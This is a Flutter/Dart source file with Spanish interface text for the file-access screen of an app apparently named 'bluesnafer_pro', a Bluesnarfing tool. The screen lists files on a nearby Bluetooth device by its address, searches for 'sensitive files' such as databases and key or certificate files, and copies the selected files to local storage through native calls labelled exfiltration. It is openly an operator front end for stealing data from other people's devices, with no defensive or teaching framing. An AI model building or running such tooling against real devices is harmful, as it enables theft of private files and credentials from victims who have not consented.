import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

/// Pantalla de acceso y exfiltración de archivos
class FileAccessScreen extends StatefulWidget {
  final Map<String, dynamic> device;

  const FileAccessScreen({super.key, required this.device});

  @override
  State<FileAccessScreen> createState() => _FileAccessScreenState();
}

class _FileAccessScreenState extends State<FileAccessScreen> {
  static const platform = MethodChannel('com.bluesnafer_pro/bluetooth');

  bool _isLoading = false;
  bool _isExfiltrating = false;
  String _statusMessage = 'Listo para explorar archivos';
  List<Map<String, dynamic>> _files = [];
  List<Map<String, dynamic>> _selectedFiles = [];
  String _currentPath = '/sdcard';

  @override
  void initState() {
    super.initState();
    _enumerateFiles();
  }

  Future<void> _enumerateFiles() async {
    setState(() {
      _isLoading = true;
      _statusMessage = 'Enumerando archivos en $_currentPath...';
      _files = [];
    });

    try {
      final result = await platform.invokeMethod('enumerateFiles', {
        'deviceAddress': widget.device['address'],
        'path': _currentPath,
      });

      final filesList = (result as List).map((f) => Map<String, dynamic>.from(f as Map)).toList();

      setState(() {
        _files = filesList;
        _isLoading = false;
        _statusMessage = '${filesList.length} archivos encontrados';
      });
    } catch (e) {
      setState(() {
        _isLoading = false;
        _statusMessage = 'Error enumerando archivos: $e';
      });
    }
  }

  Future<void> _findSensitiveFiles() async {
    setState(() {
      _isLoading = true;
      _statusMessage = 'Buscando archivos sensibles...';
    });

    try {
      final result = await platform.invokeMethod('findSensitiveFiles', {
        'deviceAddress': widget.device['address'],
        'startPath': _currentPath,
      });

      final Map<String, dynamic> categorized = Map<String, dynamic>.from(result);
      final List<Map<String, dynamic>> allSensitive = [];

      // Combinar todas las categorías
      categorized.forEach((category, files) {
        if (files is List) {
          for (var file in files) {
            final fileMap = Map<String, dynamic>.from(file as Map);
            fileMap['category'] = category;
            allSensitive.add(fileMap);
          }
        }
      });

      setState(() {
        _files = allSensitive;
        _isLoading = false;
        _statusMessage = '${allSensitive.length} archivos sensibles encontrados';
      });
    } catch (e) {
      setState(() {
        _isLoading = false;
        _statusMessage = 'Error buscando archivos: $e';
      });
    }
  }

  Future<void> _exfiltrateSelectedFiles() async {
    if (_selectedFiles.isEmpty) {
      _showMessage('Selecciona al menos un archivo');
      return;
    }

    setState(() {
      _isExfiltrating = true;
      _statusMessage = 'Exfiltrando ${_selectedFiles.length} archivo(s)...';
    });

    try {
      // Crear mapa de archivos para exfiltración
      final fileMap = <String, String>{};
      for (var file in _selectedFiles) {
        final sourcePath = file['path'] as String;
        final fileName = sourcePath.split('/').last;
        fileMap[sourcePath] = '/sdcard/Download/exfiltrated_$fileName';
      }

      final result = await platform.invokeMethod('exfiltrateMultipleFiles', {
        'deviceAddress': widget.device['address'],
        'fileMap': fileMap,
      });

      final results = Map<String, dynamic>.from(result);
      final successCount = results.values.where((v) => v == true).length;

      setState(() {
        _isExfiltrating = false;
        _statusMessage = '$successCount/${_selectedFiles.length} archivos exfiltrados';
        _selectedFiles.clear();
      });

      _showSuccessDialog(successCount, _selectedFiles.length);
    } catch (e) {
      setState(() {
        _isExfiltrating = false;
        _statusMessage = 'Error en exfiltracion: $e';
      });
    }
  }

  void _toggleFileSelection(Map<String, dynamic> file) {
    setState(() {
      if (_selectedFiles.contains(file)) {
        _selectedFiles.remove(file);
      } else {
        _selectedFiles.add(file);
      }
    });
  }

  void _showMessage(String message) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(message),
        backgroundColor: const Color(0xFF1D1E33),
      ),
    );
  }

  void _showSuccessDialog(int success, int total) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF1D1E33),
        title: const Row(
          children: [
            Icon(Icons.check_circle, color: Colors.green, size: 32),
            SizedBox(width: 12),
            Text('Exfiltración Completada', style: TextStyle(color: Colors.white)),
          ],
        ),
        content: Text(
          '$success de $total archivos fueron exfiltrados exitosamente.\n\nUbicación: /sdcard/Download/',
          style: const TextStyle(color: Colors.white70),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Cerrar'),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0A0E21),
      appBar: AppBar(
        title: const Text('Acceso a Archivos'),
        backgroundColor: const Color(0xFF1D1E33),
        elevation: 0,
        actions: [
          if (_selectedFiles.isNotEmpty)
            Padding(
              padding: const EdgeInsets.only(right: 8),
              child: Center(
                child: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                  decoration: BoxDecoration(
                    color: const Color(0xFFEB1555),
                    borderRadius: BorderRadius.circular(16),
                  ),
                  child: Text(
                    '${_selectedFiles.length} seleccionados',
                    style: const TextStyle(fontWeight: FontWeight.bold),
                  ),
                ),
              ),
            ),
        ],
      ),
      body: Column(
        children: [
          // Estado
          Container(
            width: double.infinity,
            padding: const EdgeInsets.all(16),
            color: Colors.blue.withOpacity(0.1),
            child: Row(
              children: [
                const Icon(Icons.folder_open, color: Colors.blue),
                const SizedBox(width: 12),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        _statusMessage,
                        style: const TextStyle(
                          color: Colors.blue,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                      Text(
                        'Ruta: $_currentPath',
                        style: const TextStyle(color: Colors.white70, fontSize: 12),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),

          // Acciones rápidas
          Container(
            padding: const EdgeInsets.all(16),
            child: Row(
              children: [
                Expanded(
                  child: ElevatedButton.icon(
                    onPressed: _isLoading ? null : _enumerateFiles,
                    icon: const Icon(Icons.refresh, size: 18),
                    label: const Text('Actualizar'),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.blue,
                      padding: const EdgeInsets.symmetric(vertical: 12),
                    ),
                  ),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: ElevatedButton.icon(
                    onPressed: _isLoading ? null : _findSensitiveFiles,
                    icon: const Icon(Icons.search, size: 18),
                    label: const Text('Sensibles'),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.orange,
                      padding: const EdgeInsets.symmetric(vertical: 12),
                    ),
                  ),
                ),
              ],
            ),
          ),

          // Lista de archivos
          Expanded(
            child: _isLoading
                ? const Center(
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        CircularProgressIndicator(color: Color(0xFFEB1555)),
                        SizedBox(height: 16),
                        Text(
                          'Cargando archivos...',
                          style: TextStyle(color: Colors.white70),
                        ),
                      ],
                    ),
                  )
                : _files.isEmpty
                    ? Center(
                        child: Column(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            Icon(
                              Icons.folder_off,
                              size: 64,
                              color: Colors.white.withOpacity(0.3),
                            ),
                            const SizedBox(height: 16),
                            const Text(
                              'No hay archivos para mostrar',
                              style: TextStyle(color: Colors.white70),
                            ),
                            const SizedBox(height: 8),
                            TextButton.icon(
                              onPressed: _enumerateFiles,
                              icon: const Icon(Icons.refresh),
                              label: const Text('Buscar archivos'),
                            ),
                          ],
                        ),
                      )
                    : ListView.builder(
                        itemCount: _files.length,
                        itemBuilder: (context, index) {
                          final file = _files[index];
                          final isSelected = _selectedFiles.contains(file);
                          final fileName = (file['name'] as String?) ?? 'Archivo';
                          final filePath = (file['path'] as String?) ?? '';
                          final fileSize = (file['size'] as int?) ?? 0;
                          final category = file['category'] as String?;

                          return Container(
                            margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 4),
                            decoration: BoxDecoration(
                              color: isSelected
                                  ? const Color(0xFFEB1555).withOpacity(0.2)
                                  : const Color(0xFF1D1E33),
                              borderRadius: BorderRadius.circular(8),
                              border: Border.all(
                                color: isSelected
                                    ? const Color(0xFFEB1555)
                                    : Colors.transparent,
                                width: 2,
                              ),
                            ),
                            child: ListTile(
                              leading: CircleAvatar(
                                backgroundColor: _getFileColor(fileName).withOpacity(0.2),
                                child: Icon(
                                  _getFileIcon(fileName),
                                  color: _getFileColor(fileName),
                                  size: 20,
                                ),
                              ),
                              title: Text(
                                fileName,
                                style: const TextStyle(
                                  color: Colors.white,
                                  fontWeight: FontWeight.bold,
                                ),
                                maxLines: 1,
                                overflow: TextOverflow.ellipsis,
                              ),
                              subtitle: Column(
                                crossAxisAlignment: CrossAxisAlignment.start,
                                children: [
                                  Text(
                                    filePath,
                                    style: TextStyle(
                                      color: Colors.white.withOpacity(0.5),
                                      fontSize: 11,
                                    ),
                                    maxLines: 1,
                                    overflow: TextOverflow.ellipsis,
                                  ),
                                  Row(
                                    children: [
                                      Text(
                                        _formatFileSize(fileSize),
                                        style: const TextStyle(
                                          color: Colors.white70,
                                          fontSize: 12,
                                        ),
                                      ),
                                      if (category != null) ...[
                                        const SizedBox(width: 8),
                                        Container(
                                          padding: const EdgeInsets.symmetric(
                                            horizontal: 6,
                                            vertical: 2,
                                          ),
                                          decoration: BoxDecoration(
                                            color: Colors.orange.withOpacity(0.2),
                                            borderRadius: BorderRadius.circular(4),
                                          ),
                                          child: Text(
                                            category,
                                            style: const TextStyle(
                                              color: Colors.orange,
                                              fontSize: 10,
                                            ),
                                          ),
                                        ),
                                      ],
                                    ],
                                  ),
                                ],
                              ),
                              trailing: Checkbox(
                                value: isSelected,
                                onChanged: (_) => _toggleFileSelection(file),
                                activeColor: const Color(0xFFEB1555),
                              ),
                              onTap: () => _toggleFileSelection(file),
                            ),
                          );
                        },
                      ),
          ),

          // Botón de exfiltración
          if (_selectedFiles.isNotEmpty)
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: const Color(0xFF1D1E33),
                boxShadow: [
                  BoxShadow(
                    color: Colors.black.withOpacity(0.3),
                    blurRadius: 10,
                    offset: const Offset(0, -5),
                  ),
                ],
              ),
              child: SafeArea(
                child: SizedBox(
                  width: double.infinity,
                  child: ElevatedButton.icon(
                    onPressed: _isExfiltrating ? null : _exfiltrateSelectedFiles,
                    icon: _isExfiltrating
                        ? const SizedBox(
                            width: 20,
                            height: 20,
                            child: CircularProgressIndicator(
                              strokeWidth: 2,
                              color: Colors.white,
                            ),
                          )
                        : const Icon(Icons.download),
                    label: Text(
                      _isExfiltrating
                          ? 'EXFILTRANDO...'
                          : 'EXFILTRAR ${_selectedFiles.length} ARCHIVO(S)',
                      style: const TextStyle(
                        fontSize: 16,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: const Color(0xFFEB1555),
                      padding: const EdgeInsets.symmetric(vertical: 16),
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(12),
                      ),
                    ),
                  ),
                ),
              ),
            ),
        ],
      ),
    );
  }

  IconData _getFileIcon(String fileName) {
    final ext = fileName.split('.').last.toLowerCase();
    if (['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'].contains(ext)) {
      return Icons.image;
    } else if (['mp4', 'avi', 'mkv', 'mov'].contains(ext)) {
      return Icons.video_file;
    } else if (['pdf', 'doc', 'docx', 'txt'].contains(ext)) {
      return Icons.description;
    } else if (['db', 'sqlite', 'sqlite3'].contains(ext)) {
      return Icons.storage;
    } else if (['key', 'pem', 'p12'].contains(ext)) {
      return Icons.vpn_key;
    }
    return Icons.insert_drive_file;
  }

  Color _getFileColor(String fileName) {
    final ext = fileName.split('.').last.toLowerCase();
    if (['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'].contains(ext)) {
      return Colors.purple;
    } else if (['mp4', 'avi', 'mkv', 'mov'].contains(ext)) {
      return Colors.red;
    } else if (['pdf', 'doc', 'docx', 'txt'].contains(ext)) {
      return Colors.blue;
    } else if (['db', 'sqlite', 'sqlite3'].contains(ext)) {
      return Colors.green;
    } else if (['key', 'pem', 'p12'].contains(ext)) {
      return Colors.orange;
    }
    return Colors.grey;
  }

  String _formatFileSize(int bytes) {
    if (bytes < 1024) return '$bytes B';
    if (bytes < 1024 * 1024) return '${(bytes / 1024).toStringAsFixed(1)} KB';
    if (bytes < 1024 * 1024 * 1024) {
      return '${(bytes / (1024 * 1024)).toStringAsFixed(1)} MB';
    }
    return '${(bytes / (1024 * 1024 * 1024)).toStringAsFixed(1)} GB';
  }
}


